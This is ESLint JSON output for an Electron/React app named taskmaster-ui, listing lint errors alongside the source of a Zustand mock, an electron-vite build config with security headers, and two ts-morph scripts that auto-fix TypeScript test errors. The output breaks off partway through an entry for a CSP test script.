
> taskmaster-ui@1.0.0 lint
> eslint . --max-warnings 0 --no-warn-ignored --fix --format json

[{"filePath":"/Users/davidleathers/taskmaster-ui/__mocks__/__mocks__/zustand.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/__mocks__/__mocks__/zustand/middleware.ts","messages":[{"ruleId":"@typescript-eslint/no-unused-vars","severity":2,"message":"'options' is defined but never used.","line":27,"column":45,"nodeType":null,"messageId":"unusedVar","endLine":27,"endColumn":52}],"suppressedMessages":[],"errorCount":1,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Zustand Middleware Mock for Vitest (2025)\n * \n * Provides mocks for Zustand middleware that may not work correctly\n * in test environments, particularly immer and persist.\n */\n\nimport { vi } from 'vitest';\n\n// Mock immer middleware to pass through state mutations\nexport const immer = vi.fn((stateCreator) => {\n  return (set, get, api) => {\n    const immerSet = (fn) => {\n      if (typeof fn === 'function') {\n        // For immer-style mutations, extract the new state directly\n        const newState = fn(get());\n        set(newState);\n      } else {\n        set(fn);\n      }\n    };\n    return stateCreator(immerSet, get, api);\n  };\n});\n\n// Mock persist middleware to avoid localStorage complications\nexport const persist = vi.fn((stateCreator, options) => {\n  return stateCreator;\n});\n\n// Mock subscribeWithSelector middleware\nexport const subscribeWithSelector = vi.fn((stateCreator) => {\n  return stateCreator;\n});","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/__mocks__/zustand.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/__mocks__/zustand/middleware.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/cleanup-windows.js","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/electron.vite.config.ts","messages":[{"ruleId":"@typescript-eslint/no-namespace","severity":2,"message":"ES2015 module syntax is preferred over namespaces.","line":19,"column":3,"nodeType":"TSModuleDeclaration","messageId":"moduleSyntaxIsPreferred","endLine":21,"endColumn":4},{"ruleId":"@typescript-eslint/no-empty-object-type","severity":2,"message":"An interface declaring no members is equivalent to its supertype.","line":20,"column":15,"nodeType":"Identifier","messageId":"noEmptyInterfaceWithSuper","endLine":20,"endColumn":25,"suggestions":[{"messageId":"replaceEmptyInterfaceWithSuper","fix":{"range":[607,652],"text":"type ProcessEnv = TaskMasterEnv"},"desc":"Replace empty interface with a type alias."}]}],"suppressedMessages":[],"errorCount":2,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"import { defineConfig, externalizeDepsPlugin } from 'electron-vite';\nimport react from '@vitejs/plugin-react';\nimport { resolve } from 'path';\nimport { visualizer } from 'rollup-plugin-visualizer';\nimport packageJson from './package.json';\n\n/**\n * Environment Variables Type Definitions for 2025 Type Safety\n */\ninterface TaskMasterEnv {\n  readonly MAIN_VITE_API_URL?: string;\n  readonly PRELOAD_VITE_DEBUG?: string;\n  readonly RENDERER_VITE_SENTRY_DSN?: string;\n  readonly VITE_APP_VERSION?: string;\n  readonly NODE_ENV?: 'development' | 'production' | 'test';\n}\n\ndeclare global {\n  namespace NodeJS {\n    interface ProcessEnv extends TaskMasterEnv {}\n  }\n}\n\n/**\n * electron-vite TypeScript Configuration for TaskMaster UI\n * 2025 Best Practices Implementation with Enhanced Type Safety\n * \n * This unified configuration consolidates all Electron process builds:\n * - Main process (src/main/index.ts â†’ dist/main/main.cjs)\n * - Preload script (src/preload/index.ts â†’ dist/preload/preload.cjs)  \n * - Renderer process (src/renderer â†’ dist/renderer)\n * \n * Key 2025 Features:\n * - Full TypeScript support with strict type checking\n * - Conditional configuration based on mode and command\n * - Enhanced security with CSP and modern headers\n * - Intelligent code splitting and bundle optimization\n * - Development vs Production environment handling\n * - Path aliases for maintainable imports\n * - Performance monitoring and bundle analysis\n */\nexport default defineConfig(({ command, mode }) => {\n  const isDevelopment = mode === 'development';\n  const isProduction = mode === 'production';\n  const isServe = command === 'serve';\n  const isBuild = command === 'build';\n\n  // Base configuration shared across all processes\n  const baseConfig = {\n    build: {\n      sourcemap: isDevelopment,\n      minify: isProduction ? 'terser' as const : false,\n      target: 'node18' as const,\n    },\n    define: {\n      __DEV__: isDevelopment,\n      __PROD__: isProduction,\n      'process.env.NODE_ENV': JSON.stringify(mode),\n    } as Record<string, any>,\n  };\n\n  return {\n    /**\n     * Main Process Configuration\n     * Electron main process with Node.js environment targeting\n     */\n    main: {\n      ...baseConfig,\n      plugins: [externalizeDepsPlugin()],\n      publicDir: 'resources',\n      build: {\n        ...baseConfig.build,\n        lib: {\n          entry: resolve(__dirname, 'src/main/index.ts'),\n          formats: ['cjs'] as const,\n          fileName: () => 'main.cjs',\n        },\n        outDir: 'dist/main',\n        emptyOutDir: false,\n        watch: isDevelopment ? {\n          include: ['src/main/**/*'],\n          exclude: ['node_modules/**', 'dist/**', 'out/**'],\n          buildDelay: 100,\n          clearScreen: false,\n        } : undefined,\n        rollupOptions: {\n          external: [\n            // Core Electron modules\n            'electron',\n            'electron-updater',\n            \n            // Node.js built-in modules  \n            'path', 'os', 'fs', 'child_process', 'module', 'url', \n            'crypto', 'http', 'https', 'stream', 'util', 'events',\n            \n            // All package.json dependencies external for main process\n            ...Object.keys(packageJson.dependencies || {}),\n            ...Object.keys(packageJson.devDependencies || {}),\n          ],\n          output: {\n            preserveModules: false,\n            format: 'cjs' as const,\n            exports: 'auto' as const,\n          }\n        },\n        ssr: true,\n      },\n      resolve: {\n        alias: {\n          '@': resolve(__dirname, './src'),\n          '@components': resolve(__dirname, './src/components'),\n          '@lib': resolve(__dirname, './src/lib'),\n          '@hooks': resolve(__dirname, './src/hooks'),\n          '@types': resolve(__dirname, './src/types'),\n          '@store': resolve(__dirname, './src/store'),\n          '@utils': resolve(__dirname, './src/utils'),\n          '@tests': resolve(__dirname, './tests'),\n        },\n      },\n      define: {\n        ...baseConfig.define,\n        __dirname: `\"${resolve(__dirname, 'dist', 'main')}\"`,\n        'import.meta.url': 'import.meta.url',\n      },\n    },\n\n    /**\n     * Preload Script Configuration  \n     * Secure bridge between main and renderer with sandbox compatibility\n     */\n    preload: {\n      ...baseConfig,\n      plugins: [externalizeDepsPlugin()],\n      publicDir: 'resources',\n      build: {\n        ...baseConfig.build,\n        lib: {\n          entry: resolve(__dirname, 'src/preload/index.ts'),\n          formats: ['cjs'] as const,\n          fileName: () => 'preload.cjs',\n        },\n        outDir: 'dist/preload',\n        emptyOutDir: false,\n        watch: isDevelopment ? {\n          include: ['src/preload/**/*'],\n          exclude: ['node_modules/**', 'dist/**', 'out/**'],\n          buildDelay: 100,\n          clearScreen: false,\n        } : undefined,\n        rollupOptions: {\n          external: ['electron'],\n          output: {\n            format: 'cjs' as const,\n            exports: 'auto' as const,\n            inlineDynamicImports: true,\n          }\n        },\n        ssr: true,\n      },\n      resolve: {\n        alias: {\n          '@': resolve(__dirname, './src'),\n          '@components': resolve(__dirname, './src/components'),\n          '@lib': resolve(__dirname, './src/lib'),\n          '@hooks': resolve(__dirname, './src/hooks'),\n          '@types': resolve(__dirname, './src/types'),\n          '@store': resolve(__dirname, './src/store'),\n          '@utils': resolve(__dirname, './src/utils'),\n          '@tests': resolve(__dirname, './tests'),\n        },\n      },\n    },\n\n    /**\n     * Renderer Process Configuration\n     * React frontend with enhanced security, performance, and type safety\n     */\n    renderer: {\n      ...baseConfig,\n      plugins: [\n        react({\n          // 2025 React configuration optimizations - simplified for compatibility\n        }),\n        \n        // Bundle analysis for 2025 performance monitoring\n        ...(isBuild ? [\n          visualizer({\n            filename: 'dist/bundle-analysis.html',\n            open: false,\n            gzipSize: true,\n            brotliSize: true,\n            template: 'treemap' as const,\n          }),\n        ] : []),\n      ],\n      root: resolve(__dirname, './src/renderer'),\n      publicDir: resolve(__dirname, './src/renderer/public'),\n      base: './',\n      build: {\n        ...baseConfig.build,\n        rollupOptions: {\n          input: {\n            index: resolve(__dirname, './src/renderer/index.html')\n          },\n          output: {\n            // 2025 Intelligent Code Splitting Strategy\n            manualChunks: (id: string): string | void => {\n              // Node modules chunking strategy\n              if (id.includes('node_modules')) {\n                // React ecosystem\n                if (id.includes('react') || id.includes('react-dom')) {\n                  return 'react-vendor';\n                }\n                // Material-UI ecosystem\n                if (id.includes('@mui') || id.includes('@emotion')) {\n                  return 'mui-vendor';\n                }\n                // Animation libraries\n                if (id.includes('framer-motion')) {\n                  return 'animation-vendor';\n                }\n                // Icon libraries\n                if (id.includes('lucide-react')) {\n                  return 'icons-vendor';\n                }\n                // State management\n                if (id.includes('zustand') || id.includes('immer')) {\n                  return 'state-vendor';\n                }\n                // Utilities\n                if (id.includes('date-fns') || id.includes('clsx') || id.includes('class-variance-authority')) {\n                  return 'utils-vendor';\n                }\n                // Other vendor libraries\n                return 'vendor';\n              }\n              \n              // Application code chunking\n              if (id.includes('src/components/views/')) {\n                return 'views';\n              }\n              if (id.includes('src/components/project/')) {\n                return 'project';\n              }\n              if (id.includes('src/store/')) {\n                return 'store';\n              }\n            },\n            // 2025 Asset optimization\n            chunkFileNames: isProduction ? 'assets/[name]-[hash].js' : 'assets/[name].js',\n            entryFileNames: isProduction ? 'assets/[name]-[hash].js' : 'assets/[name].js',\n            assetFileNames: isProduction ? 'assets/[name]-[hash].[ext]' : 'assets/[name].[ext]',\n          }\n        },\n        outDir: 'dist/renderer',\n        terserOptions: isProduction ? {\n          compress: {\n            drop_console: true,\n            drop_debugger: true,\n            pure_funcs: ['console.log', 'console.info'],\n          },\n          mangle: {\n            safari10: true,\n          },\n        } : undefined,\n        // 2025 Performance optimizations\n        reportCompressedSize: false, // Faster builds in CI\n        chunkSizeWarningLimit: 1000,\n      },\n      resolve: {\n        alias: {\n          '@': resolve(__dirname, './src/renderer/src'),\n          '@components': resolve(__dirname, './src/renderer/src/components'),\n          '@lib': resolve(__dirname, './src/renderer/src/lib'),\n          '@hooks': resolve(__dirname, './src/renderer/src/hooks'),\n          '@types': resolve(__dirname, './src/renderer/src/types'),\n          '@store': resolve(__dirname, './src/renderer/src/store'),\n          '@utils': resolve(__dirname, './src/renderer/src/utils'),\n          '@tests': resolve(__dirname, './tests'),\n        },\n      },\n      server: isServe ? {\n        port: 5173,\n        strictPort: false,\n        cors: true,\n        headers: {\n          // 2025 Enhanced Security Headers\n          'Content-Security-Policy': [\n            \"default-src 'self'\",\n            \"script-src 'self' 'unsafe-inline' 'unsafe-eval'\", // Vite dev needs unsafe-eval\n            \"style-src 'self' 'unsafe-inline' https://fonts.googleapis.com\",\n            \"img-src 'self' data: blob: https:\",\n            \"font-src 'self' data: https://fonts.googleapis.com https://fonts.gstatic.com\",\n            \"connect-src 'self' ws://localhost:* wss://localhost:* http://localhost:* https://localhost:*\",\n            \"object-src 'none'\",\n            \"base-uri 'self'\",\n            \"form-action 'self'\",\n            \"frame-ancestors 'none'\",\n            \"upgrade-insecure-requests\"\n          ].join('; '),\n          \n          // Additional 2025 Security Headers\n          'X-Content-Type-Options': 'nosniff',\n          'X-Frame-Options': 'DENY',\n          'X-XSS-Protection': '1; mode=block',\n          'Referrer-Policy': 'strict-origin-when-cross-origin',\n          'Cross-Origin-Embedder-Policy': 'require-corp',\n          'Cross-Origin-Opener-Policy': 'same-origin',\n          'Permissions-Policy': [\n            'accelerometer=()',\n            'camera=()',\n            'geolocation=()',\n            'gyroscope=()',\n            'magnetometer=()',\n            'microphone=()',\n            'payment=()',\n            'usb=()',\n            'interest-cohort=()'\n          ].join(', ')\n        },\n        // 2025 Development server optimizations\n        hmr: {\n          overlay: true,\n          clientPort: 5173,\n        },\n        watch: {\n          usePolling: false,\n          interval: 100,\n        },\n      } : undefined,\n      \n      // Environment-specific optimizations\n      optimizeDeps: isDevelopment ? {\n        include: [\n          'react',\n          'react-dom',\n          '@mui/material',\n          '@emotion/react',\n          '@emotion/styled',\n          'framer-motion',\n          'zustand',\n        ],\n        exclude: ['electron'],\n      } : undefined,\n    }\n  };\n});","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/eslint.config.js","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/fix-remaining-errors.ts","messages":[{"ruleId":"@typescript-eslint/no-unused-vars","severity":2,"message":"'CallExpression' is defined but never used.","line":6,"column":49,"nodeType":null,"messageId":"unusedVar","endLine":6,"endColumn":63}],"suppressedMessages":[],"errorCount":1,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Fix remaining TypeScript errors after initial pass\n * Focuses on specific error patterns that need more complex fixes\n */\n\nimport { Project, SyntaxKind, Node, SourceFile, CallExpression } from 'ts-morph'\nimport { join } from 'path'\n\nclass RemainingErrorFixer {\n  private project: Project\n\n  constructor(tsConfigPath: string) {\n    this.project = new Project({\n      tsConfigFilePath: tsConfigPath,\n      skipAddingFilesFromTsConfig: false,\n    })\n  }\n\n  // Fix UpdateCheckResult type issues\n  fixUpdateCheckResult(sourceFile: SourceFile): number {\n    let fixCount = 0\n    \n    // Find mockResolvedValue calls with updateInfo\n    sourceFile.getDescendantsOfKind(SyntaxKind.CallExpression).forEach(callExpr => {\n      const expression = callExpr.getExpression()\n      \n      if (Node.isPropertyAccessExpression(expression) && \n          expression.getName() === 'mockResolvedValue') {\n        \n        const arg = callExpr.getArguments()[0]\n        if (arg && Node.isObjectLiteralExpression(arg)) {\n          const hasUpdateInfo = arg.getProperty('updateInfo')\n          const hasCancellationToken = arg.getProperty('cancellationToken')\n          \n          if (hasUpdateInfo && hasCancellationToken && \n              !arg.getProperty('isUpdateAvailable') && \n              !arg.getProperty('versionInfo')) {\n            \n            // Add missing properties\n            arg.addPropertyAssignment({\n              name: 'isUpdateAvailable',\n              initializer: 'true'\n            })\n            \n            arg.addPropertyAssignment({\n              name: 'versionInfo',\n              initializer: '{ version: \"2.0.0\" }'\n            })\n            \n            fixCount++\n          }\n        }\n      }\n    })\n    \n    return fixCount\n  }\n\n  // Fix BaseWindow mock issues\n  fixBaseWindowMocks(sourceFile: SourceFile): number {\n    let fixCount = 0\n    \n    sourceFile.getDescendantsOfKind(SyntaxKind.CallExpression).forEach(callExpr => {\n      const args = callExpr.getArguments()\n      \n      args.forEach(arg => {\n        if (Node.isObjectLiteralExpression(arg) && arg.getText() === '{}') {\n          const parentCall = callExpr.getExpression()\n          \n          // Check if this is in a context where BaseWindow is expected\n          if (parentCall.getText().includes('webContents') || \n              parentCall.getText().includes('showMessageBox')) {\n            \n            // Replace empty object with proper BaseWindow mock\n            arg.replaceWithText(`{\n              id: 1,\n              webContents: {\n                send: vi.fn(),\n                on: vi.fn(),\n                once: vi.fn(),\n                removeListener: vi.fn()\n              },\n              on: vi.fn(),\n              off: vi.fn(),\n              once: vi.fn(),\n              addListener: vi.fn(),\n              removeListener: vi.fn(),\n              show: vi.fn(),\n              hide: vi.fn(),\n              close: vi.fn(),\n              destroy: vi.fn(),\n              isDestroyed: vi.fn().mockReturnValue(false),\n              focus: vi.fn(),\n              blur: vi.fn()\n            } as any`)\n            \n            fixCount++\n          }\n        }\n      })\n    })\n    \n    return fixCount\n  }\n\n  // Fix non-callable expressions\n  fixNonCallableMore(sourceFile: SourceFile): number {\n    let fixCount = 0\n    \n    sourceFile.getDescendantsOfKind(SyntaxKind.CallExpression).forEach(callExpr => {\n      const expression = callExpr.getExpression()\n      \n      // Fix cases where properties are called as functions\n      if (Node.isPropertyAccessExpression(expression)) {\n        const propertyName = expression.getName()\n        const objectText = expression.getExpression().getText()\n        \n        // Handle updateInfo() being called\n        if (propertyName === 'updateInfo' || propertyName === 'versionInfo') {\n          callExpr.replaceWithText(expression.getText())\n          fixCount++\n        }\n        \n        // Handle String() or Number() constructors being called incorrectly\n        if ((objectText === 'String' || objectText === 'Number') && \n            callExpr.getParent()?.getKind() === SyntaxKind.CallExpression) {\n          // This is likely String.mockReturnValue() or similar\n          // Don't count as fix, needs different approach\n        }\n      }\n    })\n    \n    return fixCount\n  }\n\n  // Fix argument count mismatches\n  fixArgumentCounts(sourceFile: SourceFile): number {\n    let fixCount = 0\n    \n    sourceFile.getDescendantsOfKind(SyntaxKind.CallExpression).forEach(callExpr => {\n      const expression = callExpr.getExpression()\n      const args = callExpr.getArguments()\n      \n      if (Node.isPropertyAccessExpression(expression)) {\n        const methodName = expression.getName()\n        const objectText = expression.getExpression().getText()\n        \n        // Fix showMessageBox mock calls\n        if (methodName === 'mockResolvedValue' && \n            objectText.includes('showMessageBox') && \n            args.length > 1) {\n          // Remove extra arguments\n          while (args.length > 1) {\n            callExpr.removeArgument(args.length - 1)\n          }\n          fixCount++\n        }\n        \n        // Fix expect().toHaveBeenCalledWith() with wrong args\n        if (methodName === 'toHaveBeenCalledWith') {\n          const expectCall = expression.getExpression()\n          if (Node.isCallExpression(expectCall)) {\n            const expectArg = expectCall.getArguments()[0]\n            // Check specific cases that need fixing\n            if (expectArg && expectArg.getText().includes('showErrorBox')) {\n              // Ensure proper argument structure\n              fixCount++\n            }\n          }\n        }\n      }\n    })\n    \n    return fixCount\n  }\n\n  // Add global type declarations for test files\n  addGlobalDeclarations(sourceFile: SourceFile): number {\n    let fixCount = 0\n    \n    // Check if file is a test file\n    if (!sourceFile.getFilePath().includes('.test.') && \n        !sourceFile.getFilePath().includes('.spec.')) {\n      return 0\n    }\n    \n    // Check for globalThis access\n    const hasGlobalAccess = sourceFile.getDescendantsOfKind(SyntaxKind.ElementAccessExpression)\n      .some(access => access.getExpression().getText() === 'globalThis')\n    \n    // Check for vi usage\n    const hasViUsage = sourceFile.getDescendantsOfKind(SyntaxKind.Identifier)\n      .some(id => id.getText() === 'vi')\n    \n    if (hasGlobalAccess || hasViUsage) {\n      const firstImport = sourceFile.getImportDeclarations()[0]\n      const insertPos = firstImport ? firstImport.getChildIndex() + 1 : 0\n      \n      // Add comprehensive global declarations\n      sourceFile.insertStatements(insertPos, `\n// Global type declarations for test environment\ndeclare global {\n  const vi: typeof import('vitest').vi\n  interface GlobalThis {\n    __mockElectron?: any\n    __electron?: any\n    electronAPI?: any\n    taskmaster?: any\n    __DEV__?: boolean\n    __TEST__?: boolean\n  }\n}\n`)\n      fixCount = 1\n    }\n    \n    return fixCount\n  }\n\n  // Fix Express route handler types\n  fixExpressHandlers(sourceFile: SourceFile): number {\n    let fixCount = 0\n    \n    // Only process mock-update-server.ts\n    if (!sourceFile.getFilePath().includes('mock-update-server')) {\n      return 0\n    }\n    \n    // Find all route handler functions\n    sourceFile.getDescendantsOfKind(SyntaxKind.CallExpression).forEach(callExpr => {\n      const expression = callExpr.getExpression()\n      \n      if (Node.isPropertyAccessExpression(expression)) {\n        const methodName = expression.getName()\n        const object = expression.getExpression()\n        \n        // Check if it's an Express route method\n        if (['get', 'post', 'put', 'delete', 'patch'].includes(methodName) &&\n            object.getText() === 'this.app') {\n          \n          const args = callExpr.getArguments()\n          if (args.length >= 2) {\n            const handler = args[1]\n            \n            // If it's an arrow function, ensure it returns void\n            if (Node.isArrowFunction(handler)) {\n              const body = handler.getBody()\n              if (Node.isBlock(body)) {\n                // Add return statement if missing\n                const statements = body.getStatements()\n                const lastStatement = statements[statements.length - 1]\n                \n                if (!Node.isReturnStatement(lastStatement)) {\n                  body.addStatements('return')\n                  fixCount++\n                }\n              }\n            }\n          }\n        }\n      }\n    })\n    \n    return fixCount\n  }\n\n  async fixAll(): Promise<void> {\n    const sourceFiles = this.project.getSourceFiles()\n    let totalFixes = 0\n\n    console.log(`Processing remaining errors in ${sourceFiles.length} files...`)\n\n    for (const sourceFile of sourceFiles) {\n      const filePath = sourceFile.getFilePath()\n      \n      if (filePath.includes('node_modules') || filePath.includes('dist')) {\n        continue\n      }\n\n      let fileFixes = 0\n\n      fileFixes += this.fixUpdateCheckResult(sourceFile)\n      fileFixes += this.fixBaseWindowMocks(sourceFile)\n      fileFixes += this.fixNonCallableMore(sourceFile)\n      fileFixes += this.fixArgumentCounts(sourceFile)\n      fileFixes += this.addGlobalDeclarations(sourceFile)\n      fileFixes += this.fixExpressHandlers(sourceFile)\n\n      if (fileFixes > 0) {\n        await sourceFile.save()\n        console.log(`Fixed ${fileFixes} more errors in ${filePath}`)\n        totalFixes += fileFixes\n      }\n    }\n\n    console.log(`\\nTotal additional fixes: ${totalFixes}`)\n  }\n}\n\n// Main execution\nasync function main() {\n  const tsConfigPath = join(process.cwd(), 'tsconfig.json')\n  const fixer = new RemainingErrorFixer(tsConfigPath)\n  await fixer.fixAll()\n}\n\nmain().catch(console.error)","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/fix-typescript-errors.ts","messages":[{"ruleId":"no-case-declarations","severity":2,"message":"Unexpected lexical declaration in case block.","line":99,"column":13,"nodeType":"VariableDeclaration","messageId":"unexpected","endLine":99,"endColumn":48,"suggestions":[{"messageId":"addBrackets","fix":{"range":[3132,3541],"text":"{ const parent = callExpr.getParent()\n            if (Node.isCallExpression(parent)) {\n              const parentMethod = parent.getExpression()\n              if (Node.isPropertyAccessExpression(parentMethod) && \n                  parentMethod.getName() === 'toHaveBeenCalledWith') {\n                // Ensure correct argument structure\n                fixCount++\n              }\n            }\n            break }"},"desc":"Add {} brackets around the case block."}]}],"suppressedMessages":[],"errorCount":1,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * TypeScript Error Fixer using ts-morph\n * Fixes common TypeScript errors in test files following 2025 best practices\n */\n\nimport { Project, SyntaxKind, Node, SourceFile } from 'ts-morph'\nimport { existsSync } from 'fs'\nimport { join } from 'path'\n\ninterface ErrorFix {\n  file: string\n  line: number\n  column: number\n  errorCode: string\n  description: string\n  fix: (sourceFile: SourceFile) => void\n}\n\nclass TypeScriptErrorFixer {\n  private project: Project\n  private errors: ErrorFix[] = []\n\n  constructor(tsConfigPath: string) {\n    this.project = new Project({\n      tsConfigFilePath: tsConfigPath,\n      skipAddingFilesFromTsConfig: false,\n    })\n  }\n\n  // Fix TS2322: Type 'null' is not assignable to type 'CancellationToken | undefined'\n  fixNullToUndefined(sourceFile: SourceFile): number {\n    let fixCount = 0\n    \n    // Find all property assignments with null\n    sourceFile.getDescendantsOfKind(SyntaxKind.PropertyAssignment).forEach(prop => {\n      const propName = prop.getName()\n      if (propName === 'cancellationToken') {\n        const initializer = prop.getInitializer()\n        if (initializer && Node.isNullLiteral(initializer)) {\n          prop.setInitializer('undefined')\n          fixCount++\n        }\n      }\n    })\n\n    return fixCount\n  }\n\n  // Fix TS2349: This expression is not callable\n  fixNonCallableExpressions(sourceFile: SourceFile): number {\n    let fixCount = 0\n\n    // Find problematic call expressions\n    sourceFile.getDescendantsOfKind(SyntaxKind.CallExpression).forEach(callExpr => {\n      const expression = callExpr.getExpression()\n      \n      // Check if it's trying to call a property that's not a function\n      if (Node.isPropertyAccessExpression(expression)) {\n        const propertyName = expression.getName()\n        \n        // Common cases where properties are mistaken for functions\n        if (['version', 'updateInfo'].includes(propertyName)) {\n          // Replace the call expression with just the property access\n          const parent = callExpr.getParent()\n          if (parent) {\n            callExpr.replaceWithText(expression.getText())\n            fixCount++\n          }\n        }\n      }\n    })\n\n    return fixCount\n  }\n\n  // Fix TS2554: Expected X arguments, but got Y\n  fixArgumentCountMismatches(sourceFile: SourceFile): number {\n    let fixCount = 0\n\n    sourceFile.getDescendantsOfKind(SyntaxKind.CallExpression).forEach(callExpr => {\n      const expression = callExpr.getExpression()\n      \n      if (Node.isPropertyAccessExpression(expression)) {\n        const methodName = expression.getName()\n        const args = callExpr.getArguments()\n        \n        // Fix specific known method signatures\n        switch (methodName) {\n          case 'mockResolvedValue':\n            if (args.length > 1 && expression.getExpression()?.getText()?.includes('showMessageBox')) {\n              // showMessageBox.mockResolvedValue should only have 1 argument\n              callExpr.removeArgument(1)\n              fixCount++\n            }\n            break\n            \n          case 'expect':\n            // Some expect calls have wrong argument counts\n            const parent = callExpr.getParent()\n            if (Node.isCallExpression(parent)) {\n              const parentMethod = parent.getExpression()\n              if (Node.isPropertyAccessExpression(parentMethod) && \n                  parentMethod.getName() === 'toHaveBeenCalledWith') {\n                // Ensure correct argument structure\n                fixCount++\n              }\n            }\n            break\n        }\n      }\n    })\n\n    return fixCount\n  }\n\n  // Fix TS6133: Variable is declared but never used\n  fixUnusedVariables(sourceFile: SourceFile): number {\n    let fixCount = 0\n\n    // Find all variable declarations\n    sourceFile.getVariableDeclarations().forEach(varDecl => {\n      const name = varDecl.getName()\n      const references = varDecl.findReferencesAsNodes()\n      \n      // If only one reference (the declaration itself), it's unused\n      if (references.length === 1) {\n        // Add underscore prefix to indicate intentionally unused\n        if (!name.startsWith('_')) {\n          varDecl.rename(`_${name}`)\n          fixCount++\n        }\n      }\n    })\n\n    return fixCount\n  }\n\n  // Fix TS2345: Argument type mismatch\n  fixTypeMismatches(sourceFile: SourceFile): number {\n    let fixCount = 0\n\n    // Fix BrowserWindow mock issues\n    sourceFile.getDescendantsOfKind(SyntaxKind.CallExpression).forEach(callExpr => {\n      const args = callExpr.getArguments()\n      \n      args.forEach(arg => {\n        if (Node.isObjectLiteralExpression(arg) && arg.getText() === '{}') {\n          const parent = callExpr.getExpression()\n          if (Node.isPropertyAccessExpression(parent) && \n              parent.getName() === 'mockReturnValue') {\n            // Replace empty object with proper mock\n            arg.replaceWithText(`{\n              on: vi.fn(),\n              off: vi.fn(),\n              once: vi.fn(),\n              addListener: vi.fn(),\n              removeListener: vi.fn(),\n              webContents: { send: vi.fn() }\n            } as any`)\n            fixCount++\n          }\n        }\n      })\n    })\n\n    return fixCount\n  }\n\n  // Fix TS7017: Element implicitly has an 'any' type\n  fixImplicitAnyGlobalAccess(sourceFile: SourceFile): number {\n    let fixCount = 0\n\n    // Add type declarations for global access\n    const globalAccesses = sourceFile.getDescendantsOfKind(SyntaxKind.ElementAccessExpression)\n      .filter(access => access.getExpression().getText() === 'globalThis')\n\n    if (globalAccesses.length > 0) {\n      // Add type declaration at the top of the file\n      const firstStatement = sourceFile.getStatements()[0]\n      if (firstStatement) {\n        sourceFile.insertStatements(0, `\n// Type declaration for global test utilities\ndeclare global {\n  interface GlobalThis {\n    __mockElectron?: any\n    __electron?: any\n    electronAPI?: any\n    taskmaster?: any\n    vi?: any\n  }\n}\n`)\n        fixCount = globalAccesses.length\n      }\n    }\n\n    return fixCount\n  }\n\n  async fixAllErrors(): Promise<void> {\n    const sourceFiles = this.project.getSourceFiles()\n    let totalFixes = 0\n\n    console.log(`Processing ${sourceFiles.length} TypeScript files...`)\n\n    for (const sourceFile of sourceFiles) {\n      const filePath = sourceFile.getFilePath()\n      \n      // Skip node_modules and dist\n      if (filePath.includes('node_modules') || filePath.includes('dist')) {\n        continue\n      }\n\n      let fileFixes = 0\n\n      // Apply all fix strategies\n      fileFixes += this.fixNullToUndefined(sourceFile)\n      fileFixes += this.fixNonCallableExpressions(sourceFile)\n      fileFixes += this.fixArgumentCountMismatches(sourceFile)\n      fileFixes += this.fixUnusedVariables(sourceFile)\n      fileFixes += this.fixTypeMismatches(sourceFile)\n      fileFixes += this.fixImplicitAnyGlobalAccess(sourceFile)\n\n      if (fileFixes > 0) {\n        await sourceFile.save()\n        console.log(`Fixed ${fileFixes} errors in ${filePath}`)\n        totalFixes += fileFixes\n      }\n    }\n\n    console.log(`\\nTotal fixes applied: ${totalFixes}`)\n  }\n}\n\n// Main execution\nasync function main() {\n  const tsConfigPath = join(process.cwd(), 'tsconfig.json')\n  \n  if (!existsSync(tsConfigPath)) {\n    console.error('tsconfig.json not found!')\n    process.exit(1)\n  }\n\n  const fixer = new TypeScriptErrorFixer(tsConfigPath)\n  await fixer.fixAllErrors()\n}\n\n// Run if executed directly\nmain().catch(console.error)\n\nexport { TypeScriptErrorFixer }","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/playwright.config.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/postcss.config.js","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/scripts/csp-security-test.js","messages":[{"ruleId":"no-case-declarations","severity":2,"message":"Unexpected lexical declaration in case block.","line":192,"column":9,"nodeType":"VariableDeclaration","messageId":"unexpected","endLine":192,"endColumn":100,"suggestions":[{"messageId":"addBrackets","fix":{"range":[5011,5242],"text":"{ const metaRegex = /<meta[^>]*http-equiv=\"Content-Security-Policy\"[^>]*content=\"([^\"]+)\"/gi;\n        let match;\n        while ((match = metaRegex.exec(content)) !== null) {\n          policies.push(match[1]);\n        }\n        break; }"},"desc":"Add {} brackets around the case block."}]},{"ruleId":"no-case-declarations","severity":2,"message":"Unexpected lexical declaration in case 